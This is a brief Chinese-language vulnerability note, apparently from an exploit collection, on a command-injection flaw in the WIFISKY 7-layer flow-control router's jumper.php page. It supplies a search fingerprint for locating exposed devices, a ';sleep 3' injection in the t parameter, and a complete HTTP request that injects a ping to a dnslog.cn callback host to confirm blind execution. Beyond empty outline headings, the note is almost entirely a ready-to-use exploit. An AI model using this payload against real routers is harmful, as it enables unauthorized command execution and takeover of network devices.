# WIFISKY7层流控路由器jumper存在命令执行漏洞

- **系统**：WIFISKY7　|　**类型**：命令执行　|　**CVE**：—
- **指纹**：`title="WIFISKY 7层流控路由器"`
- **请求**：`GET /notice/jumper.php?t=;sleep%203 HTTP/1.1`
- **关键头**：`Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
GET /notice/jumper.php?t=;ping%20h6n6s2.dnslog.cn HTTP/1.1
Host:
Cookie: SESSID=e2cc8cfb14aa1d77ffcfc93204a1d57b
Sec-Fetch-User: ?1
```

**其他**
- WIFISKY 7层流控路由器jumper存在命令执行漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * WIFISKY-7层流控路由器